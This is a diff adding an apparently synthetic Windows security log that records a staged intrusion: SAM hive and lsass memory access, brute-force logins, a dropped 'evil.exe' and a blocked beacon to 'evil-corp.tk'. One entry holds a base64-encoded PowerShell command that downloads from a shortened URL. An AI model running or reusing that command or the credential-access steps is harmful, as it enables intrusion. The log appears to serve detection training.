@@ -1,0 +1,15 @@
+[2025-09-10 19:15:01] INFO User 'admin' logged in successfully from 192.168.1.101
+[2025-09-10 19:15:05] DEBUG System process 'svchost.exe' memory usage: 124 MB
+[2025-09-10 19:15:10] INFO Service 'Windows Update' started successfully.
+[2025-09-10 19:16:02] WARN Failed login attempt for user 'guest' from IP 103.27.104.99
+[2025-09-10 19:16:15] DEBUG File access: User 'SYSTEM' read 'C:\Windows\System32\config\SAM'
+[2025-09-10 19:16:20] INFO Application 'chrome.exe' started by user 'admin'.
+[2025-09-10 19:17:30] ERROR Unauthorized access detected: Process 'powershell.exe' attempted to access 'lsass.exe' memory.
+[2025-09-10 19:17:35] INFO Network connection established from 192.168.1.101:50123 to 172.217.167.78:443
+[2025-09-10 19:18:01] CRITICAL Multiple failed login attempts for user 'root' from 45.137.21.135
+[2025-09-10 19:18:05] INFO DNS query for 'https://www.google.com/search?q=google.com' resolved to 142.250.196.142
+[2025-09-10 19:18:45] WARN PowerShell execution detected with encoded command: powershell.exe -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwAyAFIARwA5AGIAVgA=
+[2025-09-10 19:19:00] DEBUG User 'admin' accessed registry key 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
+[2025-09-10 19:19:22] CRITICAL Suspicious file created in temp directory: C:\Users\admin\AppData\Local\Temp\evil.exe. Hash: 1a7b3d9f8c5e2a6f0d9e8c1b2a3f4d5e
+[2025-09-10 19:20:10] INFO User 'admin' logged out successfully.
+[2025-09-10 19:20:15] INFO Outbound connection to suspicious domain evil-corp.tk on port 8080 blocked by firewall.
